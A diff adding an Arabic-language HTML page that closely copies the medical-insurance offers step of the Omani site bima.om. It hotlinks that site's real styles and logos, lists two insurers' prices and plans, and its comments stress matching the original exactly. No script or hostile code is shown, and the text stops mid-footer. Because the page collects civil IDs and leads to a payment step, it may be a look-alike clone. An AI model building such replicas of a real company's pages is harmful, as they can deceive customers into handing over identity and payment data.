@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>بيمة</title>
+    <link rel="stylesheet" href="https://app.bima.om/styles-NZVCYVCJ.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        .fas, .fa-solid, .fab, .fa-brands, .far, .fa-regular {
+            font-family: 'Font Awesome 6 Free' !important;
+            font-weight: 900 !important;
+        }
+    </style>
+    <style>
+        @font-face {
+            font-family: 'Tajawal Regular';
+            font-style: normal;
+            font-weight: 400;
+            src: url('https://app.bima.om/media/Tajawal-Regular-DBT5HAMZ.woff') format('woff');
+        }
+        body {
+            font-family: 'Tajawal Regular', sans-serif;
+            position: relative;
+            background: #fff;
+            font-size: 16px;
+            color: #586167;
+            margin: 0;
+            direction: rtl;
+        }
+        h1, h2, h3, h4, p, span, label, button, select, option, a, div {
+            font-family: 'Tajawal Regular', sans-serif !important;
+        }
+
+        /* Use EXACT original CSS for medical-offer components */
+        .medical-offer-card{position:relative;background:#fff;margin-bottom:1rem;transition:transform .2s ease,box-shadow .2s ease}
+        .medical-offer-tab{padding:.8rem .8rem 0;display:inline-block;background:#fff;border-radius:var(--bs-border-radius-xl);border:1px solid #e0e0e0;border-bottom:0;border-bottom-left-radius:0;border-bottom-right-radius:0;position:relative;margin-bottom:-1px;z-index:2}
+        [dir=rtl] .medical-offer-tab{border-bottom-left-radius:var(--bs-border-radius-xl);border-bottom-right-radius:0}
+        .medical-offer-tab-brand{display:inline-flex;align-items:center;gap:.55rem}
+        .medical-offer-logo{display:inline-flex;align-items:center;justify-content:center}
+        .medical-offer-logo img{height:2rem;width:auto;display:block;object-fit:contain}
+        .medical-offer-heading{display:block;margin-inline-start:0}
+        .medical-offer-provider{margin:0;font-size:16px;font-weight:600}
+        .medical-offer-content{background:#fff;border-radius:var(--bs-border-radius-xl);border:1px solid #e0e0e0;border-top-left-radius:0;position:relative;top:-1px;overflow:hidden}
+        [dir=rtl] .medical-offer-content{border-top-left-radius:var(--bs-border-radius-xl);border-top-right-radius:0}
+        .medical-offer-content.collapsed{border-bottom-left-radius:var(--bs-border-radius-xl);border-bottom-right-radius:var(--bs-border-radius-xl);overflow:hidden}
+        .medical-offer-content.collapsed .medical-offer-header-duplicate{border-bottom-left-radius:var(--bs-border-radius-xl);border-bottom-right-radius:var(--bs-border-radius-xl)}
+        .medical-offer-header{display:flex;justify-content:space-between;align-items:center;padding:.8rem}
+        .medical-offer-header-duplicate{padding:.6rem .8rem;border-top:1px solid #eef2f7;background:#fff;display:flex;flex-direction:column;align-items:stretch;gap:.55rem}
+        .medical-offer-duplicate-controls{display:grid;grid-template-columns:repeat(3,max-content);gap:.85rem 1.5rem;align-items:center;flex:1;min-width:0;width:100%}
+        .medical-offer-duplicate-control{display:block;padding:.15rem 0}
+        .medical-offer-duplicate-control .form-floating{min-width:150px;max-width:170px}
+        .medical-offer-duplicate-control .form-select{min-width:118px;max-width:170px}
+        .medical-offer-duplicate-network{display:block;min-width:150px;max-width:170px}
+        .medical-network-display{position:relative;display:flex;align-items:center;min-height:calc(3.5rem + 2px);padding:1.55rem .75rem .45rem;border:1px solid #dee2e6;border-radius:var(--bs-border-radius);background:#fff}
+        .medical-network-display__label{position:absolute;top:.45rem;left:.75rem;margin:0;color:#6c757d;font-size:.82rem;line-height:1;pointer-events:none}
+        .medical-network-display__value{color:#111827;font-size:.95rem;font-weight:500;line-height:1.2}
+        [dir=rtl] .medical-network-display__label{left:auto;right:.75rem}
+        .dropdown.has-sub-menu > a.menu-title::after,.dropdown.has-sub-menu > a.menu-title::before,.dropdown.has-sub-menu > a::after,.dropdown.has-sub-menu > a::before{display:none !important;content:none !important}
+        .medical-offer-actions{display:flex;align-items:center;gap:.85rem;flex:1;min-width:0;flex-direction:row-reverse}
+        [dir=rtl] .medical-offer-actions{flex-direction:row}
+        .medical-offer-badges{display:flex;gap:.5rem;flex-wrap:wrap;align-items:stretch;flex:1;min-width:0}
+        .medical-offer-badge{position:relative;display:inline-flex;flex-direction:column;align-items:center;justify-content:center;min-width:96px;padding:.3rem .5rem;text-align:center;gap:1px;border-radius:.5rem}
+        .medical-offer-badge div{margin:0;color:var(--bs-gray-600, #6c757d);font-size:.95rem;line-height:1.1}
+        .medical-offer-badge p{margin:0;color:var(--theme-default5, #5eac12);font-size:.95rem;line-height:1.15}
+        .medical-offer-tags-placeholder{flex:1;min-width:0}
+        .medical-download-block{display:inline-flex;align-items:center;border-left:1px solid #e0e0e0;padding-left:.85rem}
+        [dir=rtl] .medical-download-block{border-left:none;border-right:1px solid #e0e0e0;padding-left:0;padding-right:.85rem}
+        .medical-details-btn{white-space:nowrap;text-decoration:none;color:#2d6cdf;padding:0;font-size:.95rem;font-weight:400;background:none;border:none;cursor:pointer}
+        .medical-offer-price-block{display:inline-flex;align-items:center;gap:.85rem;border-left:1px solid #e0e0e0;padding-left:.85rem;margin-right:.65rem}
+        [dir=rtl] .medical-offer-price-block{border-left:none;border-right:1px solid #e0e0e0;padding-left:0;padding-right:.85rem;margin-right:0;margin-left:.65rem}
+        .medical-offer-total{text-align:right}
+        .medical-offer-premium{font-size:.9rem;line-height:1;font-weight:500}
+        .medical-offer-initial{font-size:.9rem;line-height:1.1;font-weight:500;color:#d8a700;margin-bottom:2px}
+        .medical-offer-original-price{text-decoration:line-through;color:#dc3545;font-size:.85rem;font-weight:500;display:inline-block;margin-bottom:2px}
+        .medical-offer-discounted-price{color:#43a047;font-size:1rem;font-weight:700}
+        .medical-offer-vat{font-size:.9rem;color:#6c757d;line-height:1.15}
+        .medical-choose-btn{width:fit-content;min-width:118px;max-width:138px;min-height:calc(3.5rem + 2px);display:inline-flex;flex-direction:column;align-items:center;justify-content:center;line-height:1.2;padding:.6rem .7rem;font-size:.92rem;border:0;border-radius:var(--bs-border-radius);background:linear-gradient(135deg,var(--theme-default5, #66b82f) 0%,var(--theme-default5_2, #3f8f20) 100%);color:#fff;box-shadow:0 10px 18px color-mix(in srgb,var(--theme-default5, #3f8f20) 22%,transparent);cursor:pointer}
+        .medical-choose-btn:hover:not(:disabled){background:linear-gradient(135deg,var(--theme-default5_2, #74c43d) 0%,var(--theme-default5, #4c9f26) 100%);box-shadow:0 12px 22px color-mix(in srgb,var(--theme-default5, #3f8f20) 28%,transparent);transform:translateY(-1px)}
+        .medical-choose-label{font-weight:600;font-size:.92rem}
+        .medical-offer-expand-bar{text-align:center;padding:.5rem .8rem;border-top:1px solid #eef2f7}
+        .medical-toggle{color:var(--theme-default5, #5eac12);text-decoration:none;font-size:.9rem;background:none;border:none;cursor:pointer;display:inline-flex;align-items:center;gap:.35rem}
+        .medical-toggle-label{font-weight:500}
+
+        /* Expandable details */
+        .medical-offer-details{display:none;padding:1rem .8rem;border-top:1px solid #eef2f7}
+        .medical-offer-details.show{display:block}
+        .coverage-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #f5f5f5}
+        .coverage-name{display:flex;align-items:center;gap:8px;font-size:.9rem;color:#333}
+        .coverage-value{font-weight:600;color:#333;font-size:.9rem}
+
+        /* Page heading - match original size */
+        .page-heading-1{font-size:2rem;font-weight:600;color:var(--theme-default5, #5eac12);margin:0}
+
+        /* Stepper - use original styles from external CSS */
+
+        /* Filter panel */
+        .filter-panel{margin-bottom:1rem}
+        .quote-details ul{list-style:none;padding:0;margin:0;display:flex;flex-wrap:wrap;gap:10px;justify-content:center;font-size:.9rem;color:#666}
+        .quote-details li{display:inline-flex;align-items:center;gap:4px}
+        .text-gray{color:#999}
+        .detail-separator{margin:0 2px}
+
+        /* Left sidebar */
+        .left-sidebar{position:sticky;top:1rem}
+        .advanced-search-panel{padding:0;border:0;border-radius:0;background:transparent;box-shadow:none}
+        .advanced-search-panel__header{display:flex;align-items:center;justify-content:space-between;gap:.75rem;margin-bottom:.6rem}
+        .advanced-search-panel__title{font-size:1rem;font-weight:700;color:#15324d;letter-spacing:.02em;margin-bottom:0}
+        .advanced-search-panel__subtitle{font-size:.9rem;font-weight:600;color:#5eac12;margin-bottom:.5rem}
+        .medical-company-filter{display:flex;align-items:center;gap:8px;padding:6px 0;cursor:pointer;font-size:.9rem}
+        .medical-company-filter .form-check-input{accent-color:#5eac12;width:18px;height:18px}
+
+        /* Previous button - match original gradient */
+        .btn-gradient.color-2{background:linear-gradient(135deg,var(--theme-default5, #66b82f) 0%,var(--theme-default5_2, #3f8f20) 100%);color:#fff;border:0;border-radius:var(--bs-border-radius);padding:.6rem 1.5rem;font-size:.9rem;font-weight:600;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:8px;box-shadow:0 10px 18px color-mix(in srgb,var(--theme-default5, #3f8f20) 22%,transparent)}
+        .btn-gradient.color-2:hover{background:linear-gradient(135deg,var(--theme-default5_2, #74c43d) 0%,var(--theme-default5, #4c9f26) 100%);color:#fff;text-decoration:none}
+
+        /* Footer */
+        footer{background:#1a1a2e;color:#ccc;padding:20px 0;margin-top:40px;text-align:center;font-size:.85rem}
+        footer a{color:#5eac12;text-decoration:none;margin:0 10px}
+
+        /* Responsive */
+        @media (max-width: 991px) {
+            .left-sidebar{display:none}
+        }
+        @media (max-width: 767px) {
+            .medical-offer-header{flex-direction:column;align-items:stretch;}
+            .medical-offer-actions{flex-direction:column !important;align-items:stretch;gap:.6rem;}
+            .medical-offer-badges{flex-direction:row;flex-wrap:wrap;justify-content:center;gap:.4rem;}
+            .medical-offer-badge{min-width:80px;font-size:.8rem;padding:.25rem .4rem;}
+            .medical-offer-badge div{font-size:.75rem;}
+            .medical-offer-badge p{font-size:.8rem;}
+            .medical-offer-price-block{border-left:none !important;border-right:none !important;padding:0 !important;margin:0 !important;display:flex;align-items:center;justify-content:center;gap:.6rem;width:100%;}
+            .medical-offer-total{text-align:center;}
+            .medical-download-block{border:none !important;padding:0 !important;text-align:center;}
+            .medical-offer-duplicate-controls{grid-template-columns:1fr 1fr !important;gap:.5rem !important;}
+            .medical-offer-duplicate-control .form-floating{min-width:auto;max-width:none;}
+            .medical-offer-duplicate-control .form-select{min-width:auto;max-width:none;}
+            .medical-offer-duplicate-network{min-width:auto;max-width:none;grid-column:span 2;}
+            .medical-choose-btn{width:100%;max-width:none;min-width:auto;}
+        }
+        .details-table-wrapper{overflow-x:auto;margin-top:10px;}
+        .details-table{width:100%;font-size:.85rem;border-collapse:collapse;}
+        .details-table th,.details-table td{padding:8px 12px;text-align:right;border:1px solid #dee2e6;vertical-align:middle;}
+        .details-table thead th{background:#f8f9fa;font-weight:600;font-size:.8rem;white-space:nowrap;}
+        .details-table tbody tr{cursor:pointer;}
+        .details-table tbody tr:hover{background:#f8f9fa;}
+        .coverage-badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:.75rem;margin:0 2px;}
+        .coverage-badge-green{background:#c5dfab;color:#333;}
+        .coverage-badge-yellow{background:#fff3cd;color:#333;}
+        .detail-breakdown{display:none;}
+        .detail-breakdown.show{display:table-row;}
+        .breakdown-table{width:100%;font-size:.82rem;border-collapse:collapse;margin:0;}
+        .breakdown-table td{padding:6px 12px;border-bottom:1px solid #eee;}
+        .breakdown-table .label-cell{text-align:right;}
+        .breakdown-table .value-cell{text-align:left;}
+        .breakdown-table .bold-row td{font-weight:700;}
+        .row-chevron{transition:transform .3s;display:inline-block;}
+        .row-chevron.open{transform:rotate(180deg);}
+
+
+    /* Mobile Responsive */
+    @media (max-width: 768px) {
+      /* Prevent zoom on input focus */
+      input, select, textarea { font-size: 16px !important; }
+      
+      /* Header - hamburger menu */
+      .b2b-header .container { 
+        flex-wrap: wrap; 
+        padding: 10px 15px; 
+        position: relative;
+      }
+      .b2b-header .logo img { height: 38px; }
+      .b2b-header nav { 
+        display: none;
+        width: 100%;
+        order: 3;
+        background: #fff;
+        padding: 10px 0;
+        border-top: 1px solid #eee;
+        margin-top: 10px;
+      }
+      .b2b-header nav.show { display: block; }
+      .b2b-header nav ul { 
+        flex-direction: column; 
+        gap: 0;
+        align-items: stretch;
+      }
+      .b2b-header nav ul li { 
+        border-bottom: 1px solid #f5f5f5;
+      }
+      .b2b-header nav ul li a { 
+        display: block;
+        padding: 10px 0;
+        font-size: 14px;
+      }
+      .b2b-header .header-left { 
+        gap: 10px;
+        order: 2;
+      }
+      .b2b-header .header-left a span { display: none; }
+      .b2b-header .header-left a i { font-size: 18px; }
+      .b2b-header .menu-toggle { 
+        display: flex !important;
+        order: 1;
+        background: none;
+        border: none;
+        font-size: 22px;
+        cursor: pointer;
+        padding: 5px;
+        color: #333;
+      }
+      
+      /* Page Header & Stepper */
+      .page-header { padding: 12px 0; }
+      .page-header .container { padding: 0 12px; }
+      .page-header .row { flex-direction: column; gap: 8px; }
+      .page-heading { font-size: 18px; text-align: center; margin-bottom: 8px; }
+      .sm-stepper { justify-content: center; gap: 0; }
+      .sm-stepper__item { min-width: auto; }
+      .sm-stepper__circle { width: 22px; height: 22px; font-size: 10px; }
+      .sm-stepper__label { font-size: 9px; }
+      .sm-stepper__item:not(:last-child)::after { margin: 0 4px; }
+      
+      /* Form */
+      .form-section { padding: 15px 0; }
+      .form-card { padding: 18px 12px; margin: 0 8px; max-width: 100%; }
+      .form-card h4 { font-size: 17px; }
+      .form-card .subtitle { font-size: 13px; }
+      .row-fields { flex-direction: column; gap: 0; }
+      .row-fields .form-group { flex: none; width: 100%; }
+      .form-group label { font-size: 11px; }
+      .form-control-custom { padding: 10px 12px; font-size: 16px; }
+      .phone-input { flex-direction: row; }
+      .phone-input input { font-size: 16px; }
+      .btn-submit { font-size: 15px; padding: 12px; }
+      
+      /* Tables */
+      .table-responsive { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+      .insured-table { font-size: 11px; }
+      .insured-table th, .insured-table td { padding: 6px 4px; white-space: nowrap; }
+      
+      /* Review/Checkout */
+      .review-card .row { flex-direction: column-reverse; }
+      .review-right { padding: 15px 12px; }
+      .review-left { padding: 15px 12px; border-right: none; border-top: 1px solid #eee; }
+      .summary-panel { position: static; }
+      .company-header img { width: 40px; height: 40px; }
+      .btn-buy-now { font-size: 15px; padding: 12px; }
+      .btn-prev { font-size: 13px; padding: 8px 15px; }
+      
+      /* Offers */
+      .so-offer-header { flex-direction: column; align-items: flex-start; padding: 12px; }
+      .so-offer-right { width: 100%; flex-direction: column; align-items: flex-end; }
+      
+      /* Footer */
+      .b2b-footer { margin-top: 20px; }
+      .b2b-footer .container { flex-direction: column; gap: 8px; text-align: center; }
+      .b2b-footer .footer-links { justify-content: center; flex-wrap: wrap; }
+    }
+
+  </style>
+</head>
+<body>
+    <!-- Navbar (matching original) -->
+    <header dir="rtl" style="z-index: 9;" class="header-1 header-9 inner-page light-header shadow-cls">
+        <div class="container">
+            <div class="row">
+                <div class="col">
+                    <div class="menu">
+                        <div class="brand-logo">
+                            <a href="/"><img alt="logo" class="img-fluid for-light" src="/img/logo/bima-logo.svg" style="height:45px;"></a>
+                        </div>
+                        <nav class="nav-collapse">
+                            <div class="main-navbar">
+                                <div id="mainnav">
+                                    <ul class="nav-menu">
+                                        <li class="dropdown"><a class="nav-link menu-title" href="/"> الصفحة الرئيسية </a></li>
+                                        <li class="dropdown has-sub-menu"><a href="javascript:void(0)" class="nav-link menu-title"> تأمين</a>
+                                            <ul class="nav-submenu menu-content d-none d-md-block">
+                                                <li><a href="/#MotorForm"> التأمين على المركبات </a></li>
+                                                <li><a href="/insurance/vehicleshortperiod"> تأمين المركبات المؤقت </a></li>
+                                                <li><a href="/insurance/travel"> تأمين السفر </a></li>
+                                                <li><a href="/insurance/domestic-form"> تأمين خدم المنازل </a></li>
+                                                <li><a href="/insurance/medical-form"> تأمين صحي </a></li>
+                                                <li><a href="/insurance/credit-life-form"> تأمين القروض </a></li>
+                                                <li><a href="/insurance/malpractice-form"> تأمين الاخطاء الطبية </a></li>
+                                                <li><a href="/insurance/home-form"> تأمين المنازل </a></li>
+                                            </ul>
+                                        </li>
+                                        <li class="dropdown"><a class="nav-link menu-title" href="javascript:void(0)" style="pointer-events:none;opacity:0.5;cursor:default;"> تتبع الطلب </a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </nav>
+                        <ul class="header-right x-small-pl-1rem">
+                            <li class="right-menu color-6">
+                                <ul class="nav-menu">
+                                    <li class="dropdown language"><a href="javascript:void(0)"><i class="fas fa-globe"></i></a></li>
+                                    <li class="me-3"><a href="tel:+96879997797"><i class="fas fa-headphones"></i></a></li>
+                                </ul>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Header with Stepper (matching original exactly) -->
+    <div class="page-header" id="page-header">
+        <div class="container p-0">
+            <div class="row m-0">
+                <div class="col-12 col-md-6 d-flex align-items-center justify-content-center text-center">
+                    <div class="home-title-group d-flex align-items-center flex-nowrap">
+                        <div class="home-content pt-2">
+                            <h1 class="mt-0 page-heading-1">التأمين الصحي</h1>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-12 col-md-6 d-flex align-items-center justify-content-center">
+                    <div class="pb-2 pb-md-0 pt-md-3">
+                        <div class="sm-stepper">
+                            <div class="sm-stepper__item sm-is-done">
+                                <a class="sm-stepper__link" href="/insurance/medical-form.html">
+                                    <span class="sm-stepper__circle">1</span>
+                                    <span class="sm-stepper__label">التفاصيل</span>
+                                </a>
+                            </div>
+                            <div class="sm-stepper__item sm-is-done">
+                                <a class="sm-stepper__link">
+                                    <span class="sm-stepper__circle" aria-current="step">2</span>
+                                    <span class="sm-stepper__label">العروض</span>
+                                </a>
+                            </div>
+                            <div class="sm-stepper__item">
+                                <a class="sm-stepper__link">
+                                    <span class="sm-stepper__circle">3</span>
+                                    <span class="sm-stepper__label">مراجعة</span>
+                                </a>
+                            </div>
+                            <div class="sm-stepper__item">
+                                <a class="sm-stepper__link">
+                                    <span class="sm-stepper__circle">4</span>
+                                    <span class="sm-stepper__label">الدفع</span>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <section class="quote-section property-section pb-5 mb-4">
+        <div class="container">
+            <div class="row">
+                <!-- Sidebar -->
+                <div class="col-xl-3 col-lg-4 d-none d-lg-block">
+                    <div class="left-sidebar">
+                        <div class="advanced-search-panel">
+                            <div class="advanced-search-panel__header">
+                                <div class="advanced-search-panel__title">بحث متقدم</div>
+                            </div>
+                            <div class="advanced-search-panel__body">
+                                <div class="advanced-search-panel__subtitle">شركات التأمين</div>
+                                <label class="medical-company-filter">
+                                    <input class="form-check-input" type="checkbox" checked>
+                                    <span>ليفا للتأمين</span>
+                                </label>
+                                <label class="medical-company-filter">
+                                    <input class="form-check-input" type="checkbox" checked>
+                                    <span>الخليج GIG</span>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Offers Area -->
+                <div class="col-xl-9 col-lg-8">
+                    <div class="offers-area">
+                        <!-- Filter/Details Panel -->
+                        <div class="filter-panel">
+                            <div class="property-details quote-details">
+                                <ul>
+                                    <li><span class="text-gray">رقم الاتصال</span><span class="detail-separator d-none d-md-inline">:</span> <span id="phone-display">99887766</span></li>
+                                    <li><span class="text-gray">نوع الطلب</span><span class="detail-separator d-none d-md-inline">:</span> Medical Insurance</li>
+                                    <li><span class="text-gray">نوع التأمين</span><span class="detail-separator d-none d-md-inline">:</span> Individual Medical</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <!-- Offer Card 1: ليفا للتأمين -->
+                        <div class="medical-offer-card" id="offer-liva">
+                            <div class="medical-offer-tab">
+                                <div class="medical-offer-tab-brand">
+                                    <div class="medical-offer-logo">
+                                        <img alt="مزود الخدمة" src="https://app.bima.om/Upload/Shared/Reg/d457190b-6d88-4803-931a-08d93eea68a3_thumb.png" onerror="this.src='https://app.bima.om/assets/images/default-logo.jpg'">
+                                    </div>
+                                    <div class="medical-offer-heading">
+                                        <h3 class="medical-offer-provider">ليفا للتأمين</h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="medical-offer-content collapsed">
+                                <div class="medical-offer-header">
+                                    <div class="medical-offer-actions">
+                                        <div class="medical-offer-badges">
+                                            <div class="medical-offer-badge" style="background-color: rgb(255, 243, 205);">
+                                                <div>عدد المؤمن عليهم</div>
+                                                <p><i class="fas fa-users"></i> <span class="insurer-count">1</span></p>
+                                            </div>
+                                            <div class="medical-offer-badge" style="background-color: rgb(197, 223, 171);">
+                                                <div class="plan-badge-name">Bronze</div>
+                                                <p><i class="fas fa-flag"></i> <span class="insurer-count">1</span></p>
+                                            </div>
+                                            <div class="medical-offer-badge" style="background-color: rgb(255, 243, 205);">
+                                                <div>مدة الوثيقة</div>
+                                                <p><i class="fas fa-clock"></i> One Year</p>
+                                            </div>
+                                        </div>
+                                        <div class="medical-download-block">
+                                            <button class="btn btn-link medical-details-btn" type="button" onclick="toggleDetails('liva')">
+                                                <i class="fas fa-eye"></i> عرض المزيد
+                                            </button>
+                                        </div>
+                                        <div class="medical-offer-price-block">
+                                            <div class="medical-offer-total">
+                                                <div class="medical-offer-initial">السعر الأساسي</div>
+                                                <div class="medical-offer-original-price">
+                                                    <img alt="OMR" class="me-1 align-middle" height="12" src="https://app.bima.om/assets/icons/omr-symbol.svg" width="18">
+                                                    <span class="offer-price-original" data-base-price="200.389">200.389</span>
+                                                </div>
+                                                <div class="medical-offer-discounted-price">
+                                                    <img alt="OMR" class="me-1 align-middle" height="14" src="https://app.bima.om/assets/icons/omr-symbol.svg" width="22">
+                                                    <span class="offer-price" data-base-price="200.389">150.292</span>
+                                                </div>
+                                                <div class="medical-offer-vat">+ ضريبة القيمة المضافة <span class="offer-vat" data-base-vat="10.019">7.515</span></div>
+                                            </div>
+                                            <button class="btn btn-sm medical-choose-btn" type="button" onclick="buyNow('liva')">
+                                                <span class="medical-choose-label">إشتر الآن</span>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="medical-offer-header medical-offer-header-duplicate">
+                                    <div class="medical-offer-duplicate-controls">
+                                        <div class="medical-offer-duplicate-control">
+                                            <div class="form-floating">
+                                                <select class="form-select plan-select" dir="rtl" id="offer-plan-liva" onchange="updatePlan('liva')">
+                                                    <option disabled hidden value="0">إختر</option>
+                                                    <option value="bronze" selected>Bronze</option>
+                                                    <option value="silver">Silver</option>
+                                                    <option value="gold">Gold</option>
+                                                    <option value="platinum">Platinum</option>
+                                                    <option value="platinum-dental">Platinum + Dental &amp; Optical</option>
+                                                </select>
+                                                <label for="offer-plan-liva">الخطة</label>
+                                            </div>
+                                        </div>
+                                        <div class="medical-offer-duplicate-control">
+                                            <div class="form-floating">
+                                                <select class="form-select annual-limit-select" dir="rtl" id="offer-annual-liva" onchange="updateAnnualLimit('liva')">
+                                                    <option disabled hidden value="0">إختر</option>
+                                                    <option value="5000" selected>5000</option>
+                                                    <option value="10000">10000</option>
+                                                </select>
+                                                <label for="offer-annual-liva">الحد السنوي</label>
+                                            </div>
+                                        </div>
+                                        <div class="medical-offer-duplicate-network">
+                                            <div class="medical-network-display">
+                                                <span class="medical-network-display__value" id="network-liva">Bronze Network</span>
+                                                <label class="medical-network-display__label">الشبكة</label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="medical-offer-expand-bar">
+                                        <button class="btn btn-link p-0 medical-toggle" type="button" onclick="toggleExpand('liva')">
+                                            <i class="fas fa-chevron-down"></i>
+                                            <span class="medical-toggle-label">عرض تفاصيل العرض</span>
+                                        </button>
+                                    </div>
+                                </div>
+                                <!-- Expandable details -->
+                                <div class="medical-offer-details" id="details-liva">
+                                    <div class="details-table-wrapper">
+                                        <table class="table table-bordered details-table">
+                                            <thead>
+                                                <tr>
+                                                    <th>#</th>
+                                                    <th>العلاقة</th>
+                                                    <th>الرقم المدني</th>
+                                                    <th>تاريخ الميلاد</th>
+                                                    <th>الجنس</th>
+                                                    <th>التغطيات</th>
+                                                    <th><img alt="OMR" height="12" src="https://app.bima.om/assets/icons/omr-symbol.svg" width="18"> القسط</th>
+                                                </tr>
+                                            </thead>
+                                            <tbody id="details-tbody-liva">
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Offer Card 2: الخليج GIG -->
+                        <div class="medical-offer-card" id="offer-gig">
+                            <div class="medical-offer-tab">
+                                <div class="medical-offer-tab-brand">
+                                    <div class="medical-offer-logo">
+                                        <img alt="مزود الخدمة" src="https://app.bima.om/Upload/Shared/Reg/46085f04-3946-483e-b8ee-634779b9d277_thumb.jpg" onerror="this.src='https://app.bima.om/assets/images/default-logo.jpg'">
+                                    </div>
+                                    <div class="medical-offer-heading">
+                                        <h3 class="medical-offer-provider">الخليج GIG</h3>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="medical-offer-content collapsed">
+                                <div class="medical-offer-header">
+                                    <div class="medical-offer-actions">
+                                        <div class="medical-offer-badges">
+                                            <div class="medical-offer-badge" style="background-color: rgb(255, 243, 205);">
+                                                <div>عدد المؤمن عليهم</div>
+                                                <p><i class="fas fa-users"></i> <span class="insurer-count">1</span></p>
+                                            </div>
+                                            <div class="medical-offer-badge" style="background-color: rgb(197, 223, 171);">
+                                                <div class="plan-badge-name">طبي مثالي 7</div>
+                                                <p><i class="fas fa-flag"></i> <span class="insurer-count">1</span></p>
+                                            </div>
+                                            <div class="medical-offer-badge" style="background-color: rgb(255, 243, 205);">
+                                                <div>مدة الوثيقة</div>
+                                                <p><i class="fas fa-clock"></i> One Year</p>
+                                            </div>
+                                        </div>
+                                        <div class="medical-download-block">
+                                            <button class="btn btn-link medical-details-btn" type="button" onclick="toggleDetails('gig')">
+                                                <i class="fas fa-eye"></i> عرض المزيد
+                                            </button>
+                                        </div>
+                                        <div class="medical-offer-price-block">
+                                            <div class="medical-offer-total">
+                                                <div class="medical-offer-initial">السعر الأساسي</div>
+                                                <div class="medical-offer-original-price">
+                                                    <img alt="OMR" class="me-1 align-middle" height="12" src="https://app.bima.om/assets/icons/omr-symbol.svg" width="18">
+                                                    <span class="offer-price-original" data-base-price="216.197">216.197</span>
+                                                </div>
+                                                <div class="medical-offer-discounted-price">
+                                                    <img alt="OMR" class="me-1 align-middle" height="14" src="https://app.bima.om/assets/icons/omr-symbol.svg" width="22">
+                                                    <span class="offer-price" data-base-price="216.197">162.148</span>
+                                                </div>
+                                                <div class="medical-offer-vat">+ ضريبة القيمة المضافة <span class="offer-vat" data-base-vat="10.810">8.107</span></div>
+                                            </div>
+                                            <button class="btn btn-sm medical-choose-btn" type="button" onclick="buyNow('gig')">
+                                                <span class="medical-choose-label">إشتر الآن</span>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="medical-offer-header medical-offer-header-duplicate">
+                                    <div class="medical-offer-duplicate-controls">
+                                        <div class="medical-offer-duplicate-control">
+                                            <div class="form-floating">
+                                                <select class="form-select plan-select" dir="rtl" id="offer-plan-gig" onchange="updatePlan('gig')">
+                                                    <option disabled hidden value="0">إختر</option>
+                                                    <option value="1">طبي مثالي 1</option>
+                                                    <option value="2">طبي مثالي 2</option>
+                                                    <option value="3">طبي مثالي 3</option>
+                                                    <option value="4">طبي مثالي 4</option>
+                                                    <option value="5">طبي مثالي 5</option>
+                                                    <option value="6">طبي مثالي 6</option>
+                                                    <option value="7" selected>طبي مثالي 7</option>
+                                                </select>
+                                                <label for="offer-plan-gig">الخطة</label>
+                                            </div>
+                                        </div>
+                                        <div class="medical-offer-duplicate-control">
+                                            <div class="form-floating">
+                                                <select class="form-select annual-limit-select" dir="rtl" id="offer-annual-gig" onchange="updateAnnualLimit('gig')">
+                                                    <option disabled hidden value="0">إختر</option>
+                                                    <option value="25000" selected>25000</option>
+                                                </select>
+                                                <label for="offer-annual-gig">الحد السنوي</label>
+                                            </div>
+                                        </div>
+                                        <div class="medical-offer-duplicate-network">
+                                            <div class="medical-network-display">
+                                                <span class="medical-network-display__value" id="network-gig">A.6</span>
+                                                <label class="medical-network-display__label">الشبكة</label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="medical-offer-expand-bar">
+                                        <button class="btn btn-link p-0 medical-toggle" type="button" onclick="toggleExpand('gig')">
+                                            <i class="fas fa-chevron-down"></i>
+                                            <span class="medical-toggle-label">عرض تفاصيل العرض</span>
+                                        </button>
+                                    </div>
+                                </div>
+                                <!-- Expandable details -->
+                                <div class="medical-offer-details" id="details-gig">
+                                    <div class="details-table-wrapper">
+                                        <table class="table table-bordered details-table">
+                                            <thead>
+                                                <tr>
+                                                    <th>#</th>
+                                                    <th>العلاقة</th>
+                                                    <th>الرقم المدني</th>
+                                                    <th>تاريخ الميلاد</th>
+                                                    <th>الجنس</th>
+                                                    <th>التغطيات</th>
+                                                    <th><img alt="OMR" height="12" src="https://app.bima.om/assets/icons/omr-symbol.svg" width="18"> القسط</th>
+                                                </tr>
+                                            </thead>
+                                            <tbody id="details-tbody-gig">
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Previous button (matching original) -->
+                        <div style="margin-top:1.5rem;">
+                            <button class="btn btn-sm btn-gradient color-2" type="button" onclick="goBack()">
+                                <i class="fas fa-arrow-left me-2"></i> السابق
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <p>حقوق النشر &copy; 2026, جميع الحقوق محفوظة.</p>
+            <div>
+                <a href="/">الرئيسية</a>
+                <a href="#">الشروط</a>
+                <a href="#">سياسة الخصوصية</a>
